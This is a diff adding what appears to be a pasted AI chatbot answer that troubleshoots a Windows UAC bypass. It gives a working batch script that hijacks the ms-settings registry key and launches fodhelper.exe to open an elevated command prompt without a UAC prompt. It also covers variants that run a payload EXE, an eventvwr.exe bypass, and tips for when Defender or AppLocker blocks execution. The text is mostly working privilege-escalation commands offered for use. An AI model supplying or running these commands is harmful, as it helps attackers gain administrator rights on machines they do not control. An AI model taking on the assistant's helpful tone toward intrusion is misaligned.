@@ -1,0 +1,61 @@
+2. Correct version of the bypass BAT:
+Make sure your .bat file is exactly like this:
+
+bat
+Copy
+Edit
+@echo off
+:: Create the payload key to run CMD
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start cmd.exe" /f
+
+:: Add DelegateExecute with no value (required!)
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
+
+:: Trigger fodhelper.exe to auto-elevate
+start fodhelper.exe
+🧠 Critical: The DelegateExecute must exist but have no value — just setting the default command isn't enough.
+🚀 What Should Happen
+You run the batch file
+
+fodhelper.exe launches
+
+It checks HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+It finds your malicious command (cmd.exe) and runs it with high-integrity (admin) permissions — without UAC prompt
+
+If you're just seeing the GUI and no elevated CMD prompt, here's what to try next.
+
+🛠 Fixes & Alternatives
+✅ Option 1: Use cmd.exe directly instead of start
+Try this instead in your BAT:
+
+bat
+Copy
+Edit
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+Sometimes using start cmd.exe fails due to context.
+
+✅ Option 2: Replace with a payload EXE
+If you're testing a custom payload, point it to your EXE:
+
+bat
+Copy
+Edit
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\payload.exe" /f
+✅ Option 3: Try another UAC bypass
+If fodhelper doesn't work in your environment (patched or policy blocked), try another UAC bypass method:
+
+Example: eventvwr.exe
+bat
+Copy
+Edit
+reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
+start eventvwr.exe
+🔍 Debug Tip
+After you run fodhelper.exe, open Task Manager → check if cmd.exe ran at all. If not:
+
+You're likely missing DelegateExecute
+
+UAC bypass patched
+
+AppLocker or Defender is blocking execution silently
